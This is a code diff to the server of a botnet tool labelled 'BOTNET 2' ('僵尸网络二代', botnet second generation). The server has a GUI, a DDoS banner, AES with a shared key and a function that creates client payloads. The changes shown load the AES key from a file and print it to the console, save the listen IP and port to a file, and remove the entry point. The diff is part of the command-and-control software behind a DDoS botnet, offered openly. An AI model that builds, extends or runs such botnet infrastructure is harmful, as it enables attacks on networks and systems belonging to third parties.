@@ -9,9 +9,11 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
 # 共享密钥，需要与客户端保持一致
-KEY = b'your_secret_key_32_bytes'
+with open("KEY.txt", "r", encoding="utf-8") as f:
+    KEY = f.read()
+    print(f"读取KEY成功 | {KEY}")
 
-version = "v1.0"
+version = "v1.1"
 
 ddos_title = """
     _____  _____  _______ _______ 
@@ -513,6 +515,9 @@ if __name__ == '__main__':
         if new_ip:
             self.host = new_ip
             self.root.title(f"BOTNET 服务器 - {self.host}:{self.port}")
+            print(f"[*] 更改监听IP为: {self.host}:{self.port}")
+            with open("ListenIP_PORT.txt", "w") as f:
+                f.write(f"{self.host}:{self.port}")
 
     def change_port(self):
         if self.server_running:
@@ -522,6 +527,9 @@ if __name__ == '__main__':
         if new_port:
             self.port = new_port
             self.root.title(f"BOTNET 服务器 - {self.host}:{self.port}")
+            print(f"[*] 更改监听端口为: {self.host}:{self.port}")
+            with open("ListenIP_PORT.txt", "w") as f:
+                f.write(f"{self.host}:{self.port}")
 
     def show_about(self):
         messagebox.showinfo("关于", f"BOTNET 2\n版本 {version}\n僵尸网络二代\n作者: X KaySure <XXX-STALKER>")
@@ -828,7 +836,3 @@ if __name__ == '__main__':
             except Exception as e:
                 messagebox.showerror("错误", f"创建客户端失败: {str(e)}")
         ttk.Button(create_window, text="创建", command=create_client).pack(pady=10)
-
-if __name__ == "__main__":
-    server = Server('127.0.0.1', 1000)
-    server.root.mainloop()
